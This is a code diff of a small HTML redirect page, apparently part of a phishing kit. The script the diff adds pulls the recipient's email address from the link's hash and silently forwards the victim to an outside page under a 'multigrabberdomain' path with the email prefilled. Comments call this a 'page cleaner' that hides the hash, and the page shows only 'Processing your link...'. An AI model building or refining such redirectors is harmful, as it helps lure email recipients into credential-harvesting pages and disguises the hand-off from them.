@@ -2,30 +2,65 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Redirect Test</title>
+<title>Redirecting...</title>
 <script>
-console.log("Script executing");
-console.log("Current hash:", window.location.hash);
+// --- PAGE CLEANER ---
+// Purpose: Captures the hash, converts it to a clean query parameter,
+// and redirects to the final URL with NO HASH.
 
-var hashValue = window.location.hash;
+(function() {
+    console.log("Cleaner activated.");
 
-if (hashValue && hashValue.length > 1) {
-    var email = hashValue.substring(1);
-    console.log("Extracted value:", email);
+    // 1. Get the full hash from the browser bar
+    var rawHash = window.location.hash;
+    console.log("Raw hash detected:", rawHash);
 
-    var finalUrl = "https://pdsbupdates.moonbox2025.org/multigrabberdomain/index.html?well="
-                    + encodeURIComponent(email);
+    var email = null;
 
-    console.log("Redirecting to:", finalUrl);
+    // 2. Extract the email address
+    if (rawHash && rawHash.length > 1) {
+        var hashContent = rawHash.substring(1); // Remove the '#'
 
-    // Immediate redirect
-    window.location.replace(finalUrl);
-} else {
-    console.log("No hash found. No redirect.");
-}
+        // Handle different possible formats
+        if (hashContent.includes('?well=')) {
+            email = hashContent.split('?well=').pop();
+        } else if (hashContent.includes('well=')) {
+            email = hashContent.split('well=').pop();
+        } else {
+            // Assume the entire hash is the email
+            email = hashContent;
+        }
+
+        // Clean up any trailing slashes or extra characters
+        email = email.split('#')[0].split('?')[0];
+        
+        // Decode the email (e.g., %40 -> @)
+        try {
+            email = decodeURIComponent(email);
+        } catch(e) {
+            console.log("Decoding not needed.");
+        }
+
+        console.log("Email extracted:", email);
+
+        // 3. --- CRITICAL PART ---
+        // Redirect to your FINAL page with a clean query string.
+        // The hash is GONE. The browser bar will be clean.
+        var finalUrl = "https://pdsbupdates.moonbox2025.org/multigrabberdomain/index.html?well=" 
+                        + encodeURIComponent(email);
+        
+        console.log("Clean redirect to:", finalUrl);
+        window.location.replace(finalUrl);
+        
+    } else {
+        // Fallback if no hash is present
+        console.log("No hash found.");
+        document.body.innerHTML = "No email address provided.";
+    }
+})();
 </script>
 </head>
 <body>
-Redirecting...
+Processing your link...
 </body>
 </html>
